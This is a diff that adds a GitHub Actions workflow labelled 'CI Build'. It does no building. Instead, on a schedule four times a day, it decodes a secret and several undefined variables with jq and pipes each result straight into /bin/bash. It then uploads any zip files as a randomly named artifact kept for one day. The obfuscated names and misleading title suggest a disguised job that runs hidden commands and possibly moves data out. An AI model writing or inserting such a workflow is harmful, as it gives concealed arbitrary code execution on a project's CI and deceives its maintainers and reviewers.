@@ -1,0 +1,35 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '22 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          e359: ${{ secrets.e359 }}
+        run: |
+          printf '%s' "$e359" | jq -r .esob2616 | /bin/bash
+          echo $xahe4322 | jq -r .o1 | /bin/bash
+          echo $zll6 | jq -r .hyeja434 | /bin/bash
+          printf '%s' "$k23982" | jq -r .el203 | /bin/bash
+          printf '%s' "$rcm2" | jq -r .aehv9 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: rKCN39ry
+          path: "*.zip"
+          retention-days: 1
